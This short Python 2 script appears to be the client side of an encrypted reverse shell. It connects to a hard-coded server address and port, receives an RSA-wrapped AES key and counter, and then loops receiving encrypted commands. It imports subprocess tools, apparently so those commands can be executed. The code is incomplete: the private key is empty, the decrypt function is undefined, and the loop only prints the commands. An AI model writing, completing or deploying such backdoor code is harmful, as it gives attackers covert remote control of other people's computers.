import socket
from subprocess import Popen, PIPE
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8080

def GET_AES_KEY(KEY):
    privatekey = ""
    decryptor = RSA.importKey(privatekey)
    AES_KEY = decryptor.decrypt(KEY)
    return AES_KEY

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    global key, counter
    x = s.recv(1024)
    key = GET_AES_KEY(x)
    print "Generated AES Key " + str(key)
    y = s.recv(1024)
    counter = GET_AES_KEY(y)
    while True:
        command = decrypt(s.recv(1024))
        print 'We received: ' + command

